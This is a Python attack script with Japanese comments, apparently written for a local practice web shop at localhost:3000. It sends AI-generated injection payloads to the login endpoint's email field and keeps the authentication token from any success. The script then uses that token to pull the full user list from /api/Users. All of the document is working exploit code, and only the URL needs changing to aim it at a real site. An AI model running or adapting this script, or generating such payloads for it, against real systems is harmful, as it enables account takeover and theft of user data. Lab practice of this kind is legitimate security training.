import requests
import json
import red_ai

#メイン関数
def main():
    payload = payload_p()
    user_token,logs = attack_p(*payload) #payloadは複数の戻り値があるので*を使用
    for i in logs:
        print(f"攻撃ログ：{i}")

    with open("logs.json","w",encoding="utf-8") as f:
        json.dump(logs,f,ensure_ascii=False,indent=4)

    if user_token:
        a = input("ユーザー情報を取得しますか？[Y or N]:")
        if a in["Y","y","yes"]:
            token_p(user_token)
        else:
            print("処理を終了します")
#攻撃用ペイロード
def payload_p():
    url = "http://localhost:3000/rest/user/login"  # 攻撃対象のURL
    ai_reply = red_ai.payload_ganerate() #別ファイルaicode.pyからAIで生成したペイロード読み込み
    email_payloads = ai_reply 
    pass_payloads = "aaa"
    return url,email_payloads,pass_payloads
#用意したペイロードから実際に攻撃
def attack_p(url,email_pay,pass_pay):
    logs= []
    #引数のemailペイロードを順番に読み込み
    for i in email_pay:
        print(f"\n実行中[email]:{i}---" )
        #email部分とpassword部分をpaylod変数に組み合わせ
        payload = {"email":i,"password":pass_pay}
        response = requests.post(url, json=payload) # 攻撃を実行
        #すべてのここで攻撃を記録
        recode = {
                "ペイロード": i,
                "ステータスコード": response.status_code,
                "攻撃結果":response.status_code == 200,
            }
        logs.append(recode) #logs配列に入れる
        #攻撃結果表示
        if response.status_code == 200:
            data = response.json()
            token = data["authentication"]["token"]#取得したjsonファイルの構造がAuthenticationの中にtokenがあるので、tokenを取得する
            print("攻撃が成功しました。")
            print("取得したトークン:", token)

            return token,logs
        else:
            print("攻撃が失敗しました。")
            print("ステータスコード:", response.status_code)

    return None,logs
        
#ユーザーデータ取得
def token_p(token):
    myheaders = {"Authorization":f"Bearer {token}"}
    rsa_auth = requests.get("http://localhost:3000/api/Users",headers=myheaders)
    print("ステータスコード:",rsa_auth.status_code)
    print("全ユーザー情報:", rsa_auth.json())

if __name__ == "__main__":
    main()
